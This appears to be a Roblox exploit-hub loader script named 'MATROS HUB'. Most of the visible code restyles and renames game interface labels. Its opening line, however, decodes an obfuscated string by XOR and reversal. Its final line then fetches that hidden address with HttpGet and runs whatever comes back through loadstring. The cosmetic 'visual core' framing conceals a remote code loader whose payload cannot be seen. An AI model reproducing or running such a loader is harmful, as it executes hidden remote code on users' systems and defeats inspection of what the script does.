
--[[ STAGE 2: VISUAL CORE ]]
local pG6NQSeUeMhPRDKFjh0="\022\248\255\055\251\029\025\234\022\219\002\252\204\192\188\171\162\162\180\166\136\147\137\128\113\120\115\130\108\118\105\094\064\063\070\051\058\049\029\020\058\034\050\028\036\010\254\245\228\224\231\214\244\010\193\192\198\176\232\165\163\164\136\146\144\132\117\131\172\113\092\095\102\080\086\068\078\059\048\047\100\032\024\034\077\001\001\004\243\243\232\242\217\224\204\196\209\184\195\173\182\178\225\150\166\143\200\198\177\118\115\101\099\101"local GsRR1LSpkoa71fHpPhsi=125 local p6NHUqdtnO3Th_Um8Qu=231 local PSlE52YT1UzO8uZ4uZoywm=1 local XT8JNMGyitQMB2bKvKU=6 local qldN9B4OTQ2pneI=29 local LMdc_f2YBTpZIIrYaR=true local A6E_xqC2OzzCT=bit32 and bit32.bxor if not A6E_xqC2OzzCT then A6E_xqC2OzzCT=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local o1mn9HWx2ejbzJfc={}for b6PYyOVbpWqh=1,#pG6NQSeUeMhPRDKFjh0 do local gcWXXxcNH2ZQlKqo=string.byte(pG6NQSeUeMhPRDKFjh0,b6PYyOVbpWqh)local DBk0OuswErLXg3w_jEKux=(p6NHUqdtnO3Th_Um8Qu+(b6PYyOVbpWqh*XT8JNMGyitQMB2bKvKU)+qldN9B4OTQ2pneI)%256 if PSlE52YT1UzO8uZ4uZoywm==0 then gcWXXxcNH2ZQlKqo=(gcWXXxcNH2ZQlKqo-DBk0OuswErLXg3w_jEKux)%256 o1mn9HWx2ejbzJfc[b6PYyOVbpWqh]=string.char(A6E_xqC2OzzCT(gcWXXxcNH2ZQlKqo,GsRR1LSpkoa71fHpPhsi))else gcWXXxcNH2ZQlKqo=A6E_xqC2OzzCT(gcWXXxcNH2ZQlKqo,GsRR1LSpkoa71fHpPhsi)o1mn9HWx2ejbzJfc[b6PYyOVbpWqh]=string.char((gcWXXxcNH2ZQlKqo-DBk0OuswErLXg3w_jEKux)%256)end end local PZTW4BDAFBrRJGiAIe=table.concat(o1mn9HWx2ejbzJfc)if LMdc_f2YBTpZIIrYaR then PZTW4BDAFBrRJGiAIe=string.reverse(PZTW4BDAFBrRJGiAIe)end local N3FlbRGlkyk78NoYof=PZTW4BDAFBrRJGiAIe
local HubName = "MATROS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(N3FlbRGlkyk78NoYof))()
